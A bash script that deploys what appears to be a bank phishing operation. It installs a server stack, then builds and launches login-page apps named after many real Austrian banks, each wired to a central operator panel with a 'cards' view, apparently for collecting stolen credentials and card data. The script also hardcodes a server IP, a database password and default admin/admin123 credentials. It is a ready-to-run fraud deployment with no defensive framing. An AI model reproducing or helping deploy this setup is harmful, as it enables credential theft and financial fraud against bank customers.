#!/bin/bash
# ================================================
# SHSH Panel — Full Deployment Script
# Run on a fresh Ubuntu 24.04 server as root
# Usage: cd /root/shsh_final && bash deploy.sh
# ================================================

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
LOG_FILE="/tmp/shsh-deploy.log"

echo "=== SHSH Panel Deployment ===" | tee "$LOG_FILE"
echo "Script dir: $SCRIPT_DIR" | tee -a "$LOG_FILE"
echo "Log file: $LOG_FILE"
echo ""

# ---- Helper ----
fail() { echo "[FAIL] $1" | tee -a "$LOG_FILE"; exit 1; }
ok() { echo "[OK] $1" | tee -a "$LOG_FILE"; }

# ---- 1. System packages ----
echo "[1/9] Installing system packages..." | tee -a "$LOG_FILE"
apt update -y >> "$LOG_FILE" 2>&1 || fail "apt update failed"
apt install -y nginx postgresql postgresql-contrib curl git openssl >> "$LOG_FILE" 2>&1 || fail "apt install failed"
ok "System packages installed"

# ---- 2. Node.js ----
echo "[2/9] Installing Node.js..." | tee -a "$LOG_FILE"
if ! command -v node &>/dev/null; then
  curl -fsSL https://deb.nodesource.com/setup_22.x | bash - >> "$LOG_FILE" 2>&1
  apt install -y nodejs >> "$LOG_FILE" 2>&1 || fail "Node.js install failed"
fi
node -v | tee -a "$LOG_FILE"
npm install -g pm2 >> "$LOG_FILE" 2>&1
ok "Node.js $(node -v) + PM2 installed"

# ---- 3. PostgreSQL setup ----
echo "[3/9] Setting up PostgreSQL..." | tee -a "$LOG_FILE"
systemctl start postgresql 2>/dev/null
systemctl enable postgresql 2>/dev/null
sudo -u postgres psql -c "CREATE USER shsh WITH PASSWORD 'shsh_secure_2024';" 2>/dev/null || true
sudo -u postgres psql -c "CREATE DATABASE shsh_panel OWNER shsh;" 2>/dev/null || true
sudo -u postgres psql -c "GRANT ALL PRIVILEGES ON DATABASE shsh_panel TO shsh;" 2>/dev/null || true
sudo -u postgres psql -c "ALTER USER shsh CREATEDB;" 2>/dev/null || true
ok "PostgreSQL configured"

# ---- 4. Restore database ----
echo "[4/9] Restoring database..." | tee -a "$LOG_FILE"
if [ -f "$SCRIPT_DIR/database/shsh_panel_final.dump" ]; then
  sudo -u postgres pg_restore --no-owner --no-acl -d shsh_panel "$SCRIPT_DIR/database/shsh_panel_final.dump" >> "$LOG_FILE" 2>&1 || true
  sudo -u postgres psql -d shsh_panel -c "GRANT ALL ON ALL TABLES IN SCHEMA public TO shsh; GRANT ALL ON ALL SEQUENCES IN SCHEMA public TO shsh;" >> "$LOG_FILE" 2>&1
  ok "Database restored"
else
  echo "[WARN] No database dump found at $SCRIPT_DIR/database/shsh_panel_final.dump" | tee -a "$LOG_FILE"
fi

# ---- 5. Copy project files ----
echo "[5/9] Copying project files..." | tee -a "$LOG_FILE"
rm -rf /opt/shsh-panel /opt/banks
cp -R "$SCRIPT_DIR/shsh-panel" /opt/shsh-panel
cp -R "$SCRIPT_DIR/banks" /opt/banks
ok "Files copied to /opt/"

# ---- 6. Configure .env files ----
echo "[6/9] Detecting server IP..." | tee -a "$LOG_FILE"
SERVER_IP=$(curl -s --max-time 5 ifconfig.me 2>/dev/null)
if [ -z "$SERVER_IP" ]; then
  SERVER_IP=$(curl -s --max-time 5 api.ipify.org 2>/dev/null)
fi
if [ -z "$SERVER_IP" ]; then
  SERVER_IP=$(hostname -I | awk '{print $1}')
fi
echo "Server IP: $SERVER_IP" | tee -a "$LOG_FILE"

if [ -z "$SERVER_IP" ]; then
  fail "Could not detect server IP. Set it manually in /opt/shsh-panel/.env and all bank .env files"
fi

NEXTAUTH_SECRET=$(openssl rand -hex 32)

cat > /opt/shsh-panel/.env << ENVEOF
DATABASE_URL="postgresql://shsh:shsh_secure_2024@localhost:5432/shsh_panel"
NEXTAUTH_SECRET="$NEXTAUTH_SECRET"
NEXTAUTH_URL="http://${SERVER_IP}:8500"
NEXT_PUBLIC_SITE_URL="http://${SERVER_IP}:3001"
ENVEOF

for dir in /opt/banks/*/; do
  echo "NEXT_PUBLIC_PANEL_URL=http://${SERVER_IP}:8500" > "$dir/.env"
done
ok ".env files configured"

# ---- 7. Install dependencies & build ----
echo "[7/9] Installing dependencies and building..." | tee -a "$LOG_FILE"
echo "  This takes 5-10 minutes. Grab a coffee." | tee -a "$LOG_FILE"

echo "  Building panel..." | tee -a "$LOG_FILE"
cd /opt/shsh-panel
npm install --production=false >> "$LOG_FILE" 2>&1 || fail "Panel npm install failed"
npx prisma generate >> "$LOG_FILE" 2>&1 || fail "Prisma generate failed"
npm run build >> "$LOG_FILE" 2>&1 || fail "Panel build failed"
ok "Panel built"

echo "  Building site..." | tee -a "$LOG_FILE"
cd /opt/shsh-panel/site
npm install >> "$LOG_FILE" 2>&1 || fail "Site npm install failed"
npm run build >> "$LOG_FILE" 2>&1 || fail "Site build failed"
ok "Site built"

echo "  Building banks..." | tee -a "$LOG_FILE"
BANK_FAIL=0
for dir in /opt/banks/*/; do
  bank=$(basename "$dir")
  echo "    $bank..." | tee -a "$LOG_FILE"
  cd "$dir"
  npm install >> "$LOG_FILE" 2>&1
  npm run build >> "$LOG_FILE" 2>&1
  if [ $? -ne 0 ]; then
    echo "    [WARN] $bank build failed" | tee -a "$LOG_FILE"
    BANK_FAIL=$((BANK_FAIL + 1))
  fi
done
if [ $BANK_FAIL -gt 0 ]; then
  echo "  [WARN] $BANK_FAIL bank(s) failed to build. Check $LOG_FILE" | tee -a "$LOG_FILE"
else
  ok "All banks built"
fi

# ---- 8. Start with PM2 ----
echo "[8/9] Starting all services with PM2..." | tee -a "$LOG_FILE"

# Kill any existing PM2 processes
pm2 kill 2>/dev/null || true

cd /opt/shsh-panel && pm2 start npm --name panel -- start -- -p 8500
cd /opt/shsh-panel/site && pm2 start npm --name site -- start -- -p 3001
cd /opt/banks/vkb-login && pm2 start npm --name vkb -- start -- -p 3010
cd /opt/banks/oberbank-login && pm2 start npm --name oberbank -- start -- -p 3011
cd /opt/banks/bank99-login && pm2 start npm --name bank99 -- start -- -p 3012
cd /opt/banks/hypo-login && pm2 start npm --name hypo -- start -- -p 3013
cd /opt/banks/raiffeisen-login && pm2 start npm --name raiffeisen -- start -- -p 3014
cd /opt/banks/austria-next && pm2 start npm --name bank-austria -- start -- -p 3015
cd /opt/banks/burgenland-next && pm2 start npm --name burgenland -- start -- -p 3016
cd /opt/banks/hypo-vorarlberg-next && pm2 start npm --name hypo-vorarlberg -- start -- -p 3017
cd /opt/banks/hyponoe-next && pm2 start npm --name hypo-noe -- start -- -p 3018
cd /opt/banks/hypotirol-next && pm2 start npm --name hypotirol -- start -- -p 3019
cd /opt/banks/mypaylife-next && pm2 start npm --name mypaylife -- start -- -p 3020
cd /opt/banks/poso-next && pm2 start npm --name poso -- start -- -p 3021
cd /opt/banks/volks-next && pm2 start npm --name volksbank -- start -- -p 3022
cd /opt/banks/bawag-next && pm2 start npm --name bawag -- start -- -p 3023
cd /opt/banks/easybank-next && pm2 start npm --name easybank -- start -- -p 3024
cd /opt/banks/sparkasse-next && pm2 start npm --name sparkasse -- start -- -p 3025
cd /opt/banks/bks-next && pm2 start npm --name bks -- start -- -p 3026

pm2 save
pm2 startup -u root --hp /root 2>/dev/null || pm2 startup 2>/dev/null || true
ok "PM2 started ($(pm2 list --no-color 2>/dev/null | grep -c online) processes online)"

# ---- 9. Nginx config ----
echo "[9/9] Configuring Nginx..." | tee -a "$LOG_FILE"
rm -f /etc/nginx/sites-enabled/default
cp "$SCRIPT_DIR/configs/nginx/sites-enabled/shsh-panel" /etc/nginx/sites-enabled/shsh-panel 2>/dev/null || true

if [ -f /etc/nginx/sites-enabled/shsh-panel ]; then
  sed -i "s/144.31.106.50/$SERVER_IP/g" /etc/nginx/sites-enabled/shsh-panel
  nginx -t >> "$LOG_FILE" 2>&1 && systemctl reload nginx
  ok "Nginx configured"
else
  echo "[WARN] Nginx config not found. You'll need to configure it manually." | tee -a "$LOG_FILE"
fi

# ---- Done ----
echo "" | tee -a "$LOG_FILE"
echo "================================================" | tee -a "$LOG_FILE"
echo "  DEPLOYMENT COMPLETE!" | tee -a "$LOG_FILE"
echo "================================================" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"
echo "  Panel:    http://${SERVER_IP}:8500" | tee -a "$LOG_FILE"
echo "  Operator: http://${SERVER_IP}:8500/operator" | tee -a "$LOG_FILE"
echo "  Cards:    http://${SERVER_IP}:8500/operator/cards" | tee -a "$LOG_FILE"
echo "  Site:     http://${SERVER_IP}:3001" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"
echo "  Login:    admin / admin123" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"
echo "  Logs:     pm2 logs" | tee -a "$LOG_FILE"
echo "  Status:   pm2 list" | tee -a "$LOG_FILE"
echo "  Full log: cat $LOG_FILE" | tee -a "$LOG_FILE"
echo "================================================" | tee -a "$LOG_FILE"
